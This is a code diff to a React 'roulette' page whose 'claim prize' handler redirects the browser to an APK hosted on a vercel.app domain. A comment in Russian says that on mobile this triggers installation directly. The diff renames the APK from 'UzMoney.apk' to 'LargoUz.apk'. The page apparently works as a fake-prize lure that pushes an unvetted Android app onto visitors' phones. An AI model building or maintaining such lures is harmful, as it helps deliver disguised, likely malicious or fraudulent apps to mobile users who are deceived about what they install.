@@ -125,7 +125,7 @@ export default function RoulettePage() {
   const handleClaimPrize = (e) => {
     e.preventDefault();
 
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/LargoUz.apk';
     
     // На мобилке: попытка открыть напрямую (вызовет установку)
     window.location.href = apkUrl;
